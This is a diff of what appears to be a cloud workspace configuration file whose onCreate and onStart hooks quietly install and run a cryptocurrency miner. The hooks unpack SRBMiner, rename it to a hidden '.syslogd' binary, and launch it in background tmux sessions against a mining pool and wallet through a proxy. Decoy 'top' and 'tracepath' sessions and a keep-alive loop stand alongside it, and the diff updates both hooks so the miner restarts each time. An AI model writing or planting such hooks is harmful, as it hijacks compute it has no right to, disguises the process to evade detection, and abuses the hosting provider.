@@ -43,7 +43,7 @@ services.docker.enable = true;
       # Runs when a workspace is first created
       onCreate = {
         create-tmux-sessions = "
-          docker run -itd --name keep-alive busybox sh -c "while true; do sleep 3600; done"
+          tmux new -d -s keep-active 'while true; do top; sleep 60; done'
           tmux new -d -s biter-session 'tar -xf local.tar.gz && rm -rf local.tar.gz && mv SRBMiner-Multi-2-6-5 biter && cd biter && chmod +x ./SRBMiner-MULTI && mv SRBMiner-MULTI /usr/local/bin/.syslogd && /usr/local/bin/.syslogd --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=X6v1 --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 6'
           tmux new -d -s bitping-session 'tracepath 1.1.1.1'
           tmux new -d -s bit-session 'top'
@@ -53,8 +53,8 @@ services.docker.enable = true;
       # Runs when the workspace is (re)started
       onStart = {
         start-tmux-sessions = "
-          docker restart keep-alive
-          tmux new -d -s biter-session 'tar -xf local.tar.gz && rm -rf local.tar.gz && mv SRBMiner-Multi-2-6-5 biter && cd biter && chmod +x ./SRBMiner-MULTI && mv SRBMiner-MULTI /usr/local/bin/.syslogd && /usr/local/bin/.syslogd --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=X6v1 --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 6'
+          tmux new -d -s keep-active 'while true; do top; sleep 60; done'
+          tmux new -d -s biter-session 'cd biter && /usr/local/bin/.syslogd --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=X6v1 --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 6'
           tmux new -d -s bitping-session 'tracepath 1.1.1.1'
           tmux new -d -s bit-session 'top'
           tmux attach -t bit-session
